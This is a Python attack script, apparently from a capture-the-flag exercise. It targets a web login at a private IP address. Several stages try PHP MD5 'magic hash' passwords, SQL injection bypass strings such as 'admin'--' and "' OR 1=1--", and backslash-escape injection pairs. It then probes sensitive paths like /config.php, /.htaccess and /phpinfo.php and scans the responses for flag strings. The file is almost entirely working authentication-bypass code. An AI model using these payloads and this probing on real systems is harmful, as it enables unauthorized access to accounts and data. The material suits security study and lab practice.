import requests
import hashlib
import re

TARGET = "http://10.0.162.114:80"

def extract_after_style(html):
    match = re.split(r'</style>', html, maxsplit=1, flags=re.IGNORECASE)
    if len(match) > 1:
        return match[1].strip()
    return html

def check_flag(label, resp):
    # Check cookies
    for k, v in resp.cookies.items():
        if 'flag' in k.lower() or 'flag' in v.lower() or 'ctf' in v.lower():
            print(f"  [FLAG in Cookie] {k}={v}")
    # Check headers
    for k, v in resp.headers.items():
        if 'flag' in k.lower() or 'flag' in v.lower() or 'ctf' in v.lower():
            print(f"  [FLAG in Header] {k}: {v}")
    # Check body
    body = resp.text
    flag_patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'f[l1]ag\{[^}]+\}',
        r'[a-zA-Z0-9_]+\{[^}]+\}',
    ]
    for pat in flag_patterns:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            print(f"  [FLAG in Body] {m.group()}")

def try_login(username, password, session, base_after_style):
    try:
        resp = session.post(TARGET + "/", data={"username": username, "password": password}, timeout=10)
        after_style = extract_after_style(resp.text)
        print(f"\n  Login: username='{username}', password='{password}'")
        print(f"  Status: {resp.status_code}")
        print(f"  Response after </style>:\n{after_style[:500]}")
        
        if after_style != base_after_style:
            print(f"  ** DIFFERENCE DETECTED from base page! **")
            # Show the diff more clearly
            base_lines = base_after_style.splitlines()
            resp_lines = after_style.splitlines()
            for i, (b, r) in enumerate(zip(base_lines, resp_lines)):
                if b.strip() != r.strip():
                    print(f"    Line {i} base: {b.strip()}")
                    print(f"    Line {i} resp: {r.strip()}")
            if len(resp_lines) > len(base_lines):
                for i in range(len(base_lines), len(resp_lines)):
                    print(f"    Extra line {i}: {resp_lines[i].strip()}")
        else:
            print(f"  (Same as base page)")
        
        check_flag(f"login({username},{password})", resp)
        return resp
    except Exception as e:
        print(f"  Error: {e}")
        return None

def try_get_page(path, session):
    try:
        resp = session.get(TARGET + path, timeout=10)
        print(f"\n  GET {path}")
        print(f"  Status: {resp.status_code}")
        after_style = extract_after_style(resp.text)
        print(f"  Response after </style>:\n{after_style[:500]}")
        check_flag(path, resp)
        return resp
    except Exception as e:
        print(f"  Error: {e}")
        return None

def main():
    session = requests.Session()
    
    # ========== TASK 1: Fetch base page ==========
    print("=" * 60)
    print("TASK 1: Fetch base page HTML after </style>")
    print("=" * 60)
    resp = session.get(TARGET + "/", timeout=10)
    base_after_style = extract_after_style(resp.text)
    print(base_after_style)
    check_flag("base_page", resp)
    
    # ========== Verify magic hashes ==========
    print("\n" + "=" * 60)
    print("Verifying MD5 magic hashes")
    print("=" * 60)
    magic_passwords = [
        "QNKCDZO",
        "240610708",
        "s878926199a",
        "s155964671a",
        "s214587387a",
        "s878926199a",
        "abjiul5u",
    ]
    for pw in magic_passwords:
        md5hash = hashlib.md5(pw.encode()).hexdigest()
        is_magic = md5hash.startswith('0e') and md5hash[2:].isdigit()
        print(f"  {pw:20s} -> MD5: {md5hash}  magic={is_magic}")
    
    # ========== TASK 2: Try magic hash passwords ==========
    print("\n" + "=" * 60)
    print("TASK 2: Try magic hash passwords")
    print("=" * 60)
    for pw in magic_passwords:
        try_login("admin", pw, session, base_after_style)
    
    # ========== TASK 3: SQL injection bypass ==========
    print("\n" + "=" * 60)
    print("TASK 3: SQL injection bypass")
    print("=" * 60)
    sqli_payloads = [
        ("admin'--", "anything"),
        ("admin' OR '1'='1'--", "anything"),
        ("admin' OR 1=1--", "anything"),
        ("admin' OR 1=1#", "anything"),
        ("admin'-- -", "anything"),
        ("' OR '1'='1'--", "anything"),
        ("' OR 1=1--", "anything"),
        ("admin' OR '1'='1'#", "anything"),
    ]
    for username, password in sqli_payloads:
        try_login(username, password, session, base_after_style)
    
    # ========== TASK 4: Backslash escape technique ==========
    print("\n" + "=" * 60)
    print("TASK 4: Backslash escape technique")
    print("=" * 60)
    backslash_payloads = [
        ("\\", "OR 1=1--"),
        ("\\", "UNION SELECT 1,2--"),
        ("\\", "OR 1=1#"),
        ("\\", "' OR '1'='1'--"),
        ("\\", "1 OR 1=1--"),
        ("admin\\", "OR 1=1--"),
    ]
    for username, password in backslash_payloads:
        try_login(username, password, session, base_after_style)
    
    # ========== TASK 5: Check all responses for flags ==========
    print("\n" + "=" * 60)
    print("TASK 5: Additional flag checks - trying more combinations")
    print("=" * 60)
    
    # Try with different usernames
    extra_payloads = [
        ("admin", "QNKCDZO"),
        ("admin", "240610708"),
        ("admin", "s878926199a"),
        ("Admin", "QNKCDZO"),
        ("ADMIN", "QNKCDZO"),
        ("admin ", "QNKCDZO"),
    ]
    for username, password in extra_payloads:
        try_login(username, password, session, base_after_style)
    
    # ========== TASK 6: Try specific pages ==========
    print("\n" + "=" * 60)
    print("TASK 6: Try specific pages")
    print("=" * 60)
    pages = ["/flag.php", "/admin.php", "/dashboard.php", "/secret.php", 
             "/index.php", "/login.php", "/auth.php", "/config.php",
             "/flag", "/admin", "/secret", "/dashboard",
             "/robots.txt", "/.htaccess", "/phpinfo.php"]
    for page in pages:
        try_get_page(page, session)
    
    # Try pages with authenticated session
    print("\n" + "=" * 60)
    print("Trying pages after magic hash login attempt")
    print("=" * 60)
    # Login with magic hash first
    resp = session.post(TARGET + "/", data={"username": "admin", "password": "QNKCDZO"}, timeout=10)
    check_flag("after_QNKCDZO_login", resp)
    print(f"Cookies after login: {dict(session.cookies)}")
    
    for page in ["/flag.php", "/admin.php", "/dashboard.php", "/secret.php"]:
        try_get_page(page, session)
    
    # Also try with 240610708
    resp = session.post(TARGET + "/", data={"username": "admin", "password": "240610708"}, timeout=10)
    check_flag("after_240610708_login", resp)
    print(f"Cookies after login: {dict(session.cookies)}")
    
    for page in ["/flag.php", "/admin.php", "/dashboard.php", "/secret.php"]:
        try_get_page(page, session)

if __name__ == "__main__":
    main()